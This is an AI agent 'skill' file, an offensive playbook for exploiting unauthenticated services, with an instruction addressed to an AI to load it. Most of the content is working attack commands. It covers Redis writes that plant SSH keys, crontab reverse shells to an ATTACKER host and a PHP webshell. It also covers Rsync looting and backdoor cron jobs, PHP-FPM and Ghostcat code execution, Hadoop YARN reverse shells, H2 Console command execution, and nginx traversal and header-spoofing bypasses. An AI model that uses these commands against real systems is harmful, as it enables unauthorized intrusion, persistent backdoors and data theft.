---
name: unauthorized-access-common-services
description: >-
  Unauthorized access playbook for common exposed services. Use when Redis, Rsync, PHP-FPM, AJP/Ghostcat, Hadoop YARN, H2 Console, or similar management interfaces are exposed without authentication.
---

# SKILL: Unauthorized Access to Common Services

> **AI LOAD INSTRUCTION**: Expert techniques for exploiting unauthenticated management services. Covers Redis write-to-RCE, Rsync data theft, PHP-FPM code execution, Ghostcat AJP file read, Hadoop YARN job submission, and H2 Console JNDI.

## 0. RELATED ROUTING

- [ssrf-server-side-request-forgery](../ssrf-server-side-request-forgery/SKILL.md) when reachable via SSRF
- [jndi-injection](../jndi-injection/SKILL.md) when H2 Console accepts JNDI connection strings

---

## 1. DISCOVERY

```bash
nmap -sV -p 6379,873,9000,8009,8088,8082,1099,9200,5984,2375,27017,11211 TARGET

# Key ports:
# 6379  -- Redis
# 873   -- Rsync
# 9000  -- PHP-FPM (FastCGI)
# 8009  -- AJP (Tomcat Ghostcat)
# 8088  -- Hadoop YARN ResourceManager
# 8082  -- H2 Console
# 2375  -- Docker API (unauthenticated)
# 9200  -- Elasticsearch
# 27017 -- MongoDB
```

---

## 2. REDIS (PORT 6379)

```bash
# Detection:
redis-cli -h TARGET ping  # PONG = unauthenticated
redis-cli -h TARGET INFO server

# Write SSH authorized_keys:
cat redis_rsa.pub | redis-cli -h TARGET -x set ssh_key
redis-cli -h TARGET config set dir /root/.ssh
redis-cli -h TARGET config set dbfilename authorized_keys
redis-cli -h TARGET save
ssh -i redis_rsa root@TARGET

# Write crontab reverse shell:
redis-cli -h TARGET
> set x "\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1\n\n"
> config set dir /var/spool/cron/
> config set dbfilename root
> save

# Write webshell:
> set webshell "<?php system($_GET['cmd']); ?>"
> config set dir /var/www/html/
> config set dbfilename shell.php
> save

# Master-Slave RCE (redis-rogue-server):
python3 redis-rogue-server.py --rhost TARGET --lhost ATTACKER
```

---

## 3. RSYNC (PORT 873)

```bash
# List modules:
rsync TARGET::

# Download entire module:
rsync -av TARGET::MODULE_NAME /tmp/loot/

# Write reverse shell cron:
echo '*/1 * * * * bash -i >& /dev/tcp/ATTACKER/4444 0>&1' > /tmp/evil_cron
rsync -av /tmp/evil_cron TARGET::MODULE/cron.d/backdoor
```

---

## 4. PHP-FPM / FASTCGI (PORT 9000)

```bash
# Direct exploitation:
python3 fpm.py TARGET 9000 /var/www/html/index.php -c "<?php system('id'); ?>"

# Key FastCGI env vars:
# SCRIPT_FILENAME = /var/www/html/index.php  (must exist)
# PHP_VALUE = auto_prepend_file = php://input
# PHP_ADMIN_VALUE = allow_url_include = On

# Via SSRF gopher:
python3 gopherus.py --exploit fastcgi
```

---

## 5. GHOSTCAT -- AJP (PORT 8009) -- CVE-2020-1938

```bash
# File read:
python3 ajpShooter.py TARGET 8009 /WEB-INF/web.xml read
python3 ajpShooter.py TARGET 8009 /WEB-INF/classes/com/example/Config.class read

# File include RCE (if upload exists):
python3 ajpShooter.py TARGET 8009 /uploaded_avatar.txt eval
# uploaded_avatar.txt must contain JSP code
```

---

## 6. HADOOP YARN (PORT 8088)

```bash
# RCE via application submission:
curl http://TARGET:8088/cluster  # detection

curl -s -X POST http://TARGET:8088/ws/v1/cluster/apps/new-application
# Returns application-id

curl -s -X POST http://TARGET:8088/ws/v1/cluster/apps \
  -H "Content-Type: application/json" \
  -d '{"application-id":"application_xxx_0001","application-name":"test","am-container-spec":{"commands":{"command":"/bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1"}},"application-type":"YARN"}'
```

---

## 7. H2 DATABASE CONSOLE

```bash
# Access: http://TARGET:PORT/h2-console
# Detection: spring.h2.console.enabled=true + web-allow-others=true

# RCE via alias:
CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(cmd); return "ok"; }';
CALL EXEC('id');

# JNDI injection via JDBC URL field -> see jndi-injection skill
```

---

## 8. REVERSE PROXY MISCONFIGURATIONS

```nginx
# Nginx off-by-slash path traversal:
location /static {
    alias /var/www/static/;  # missing slash on location
}
# Attack: /static../etc/passwd -> /var/www/etc/passwd

# X-Forwarded-For bypass:
GET /admin HTTP/1.1
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
```

---

## 9. QUICK REFERENCE

```text
# Redis auth check: redis-cli -h TARGET ping
# Rsync list: rsync TARGET::
# Ghostcat read: python3 ajpShooter.py TARGET 8009 /WEB-INF/web.xml read
# YARN RCE: POST http://TARGET:8088/ws/v1/cluster/apps
# H2 RCE: CREATE ALIAS EXEC ... CALL EXEC('id')
```
